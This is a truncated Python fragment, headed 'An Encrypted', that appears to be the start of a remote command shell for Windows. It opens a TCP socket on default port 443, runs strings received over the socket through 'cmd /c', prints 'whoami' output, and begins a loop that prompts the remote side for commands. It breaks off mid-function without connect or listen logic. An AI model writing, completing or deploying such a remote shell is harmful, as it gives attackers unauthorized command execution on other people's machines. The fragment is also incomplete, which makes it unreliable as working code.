# An Encrypted 
import socket 
import subprocess
import threading
import argparse

MAX_BUFFER = 4096
DEFAULT_PORT = 443
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def execute_cmd(cmd):
    try:
        output = subprocess.check_output(f"cmd /c {cmd}")
    except:
        output = b"Command failed!"
    return output

print(execute_cmd("whoami").decode())

def shell_thread(sock):
    sock.send(b"\r\nEnter Command")
    
    data = sock.recv(MAX_BUFFER)
    if data:
        buffer = data.decode()

        if not buffer or buffer == "exit":
            print("Did not receive")
